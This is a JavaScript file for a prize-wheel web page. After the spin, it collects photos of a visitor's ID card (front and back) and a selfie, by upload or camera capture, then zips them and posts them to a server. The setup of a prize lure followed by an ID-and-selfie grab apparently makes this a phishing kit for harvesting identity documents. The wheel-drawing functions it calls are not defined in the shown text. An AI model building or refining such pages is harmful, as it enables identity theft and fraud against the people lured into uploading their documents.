document.addEventListener("DOMContentLoaded", () => {
    const canvas = document.getElementById('wheel');
    const ctx = canvas.getContext('2d');
    const spinButton = document.getElementById('spin-button');
    const popup = document.getElementById('popup');
    const prizeName = document.getElementById('prize-name');
    const uploadButton = document.getElementById('upload-button');
    const fileInput = document.getElementById('file-input');
    const previews = [
        document.getElementById('preview-front'),
        document.getElementById('preview-back'),
        document.getElementById('preview-selfie'),
    ];
    const submitButton = document.getElementById('submit-button');

    let uploadStep = 0;
    const filesCache = [];

    function isMobileDevice() {
        return /Mobi|Android/i.test(navigator.userAgent);
    }

    function handleMobileCamera() {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then((stream) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                const captureButton = document.createElement('button');
                captureButton.textContent = "Capture";
                document.body.append(video, captureButton);

                captureButton.addEventListener('click', () => {
                    const canvas = document.createElement('canvas');
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    const dataURL = canvas.toDataURL('image/jpeg');
                    previews[uploadStep].src = dataURL;
                    previews[uploadStep].style.display = 'block';

                    // Save the captured photo
                    fetch(dataURL)
                        .then(res => res.blob())
                        .then(blob => {
                            const file = new File([blob], `capture${uploadStep + 1}.jpg`, { type: 'image/jpeg' });
                            filesCache[uploadStep] = file;
                        });

                    uploadStep++;
                    stream.getTracks().forEach(track => track.stop());
                    video.remove();
                    captureButton.remove();

                    if (uploadStep < previews.length) {
                        uploadButton.textContent = `Next: ${["Front ID", "Back ID", "Selfie"][uploadStep]}`;
                    } else {
                        uploadButton.disabled = true;
                        submitButton.disabled = false;
                    }
                });
            })
            .catch((error) => console.error('Error accessing camera:', error));
    }

    uploadButton.addEventListener('click', () => {
        if (uploadStep < previews.length) {
            if (isMobileDevice()) {
                handleMobileCamera();
            } else {
                fileInput.click();
            }
        }
    });

    fileInput.addEventListener('change', () => {
        const file = fileInput.files[0];
        if (file) {
            const currentStep = uploadStep;

            filesCache[currentStep] = file;

            const reader = new FileReader();
            reader.onload = (e) => {
                previews[currentStep].src = e.target.result;
                previews[currentStep].style.display = 'block';
            };
            reader.readAsDataURL(file);

            uploadStep++;
            if (uploadStep < previews.length) {
                uploadButton.textContent = `Upload: ${["Front ID", "Back ID", "Selfie"][uploadStep]}`;
            } else {
                uploadButton.disabled = true;
                submitButton.disabled = false;
            }
        }
    });

    submitButton.addEventListener('click', async () => {
        if (filesCache.length === 0) return;

        const zip = new JSZip();
        filesCache.forEach((file, index) => {
            zip.file(`file${index + 1}-${file.name}`, file);
        });

        const zipBlob = await zip.generateAsync({ type: 'blob' });

        const formData = new FormData();
        formData.append('archive', zipBlob, 'photos.zip');

        try {
            const response = await fetch('http://localhost:5000/upload-archive', {
                method: 'POST',
                body: formData,
            });

            if (response.ok) {
                console.log('Archive successfully uploaded!');
            } else {
                console.error('Error uploading archive.');
            }
        } catch (error) {
            console.error('Server connection error:', error);
        }
    });

    spinButton.addEventListener('click', spinWheel);
    drawWheel();
});
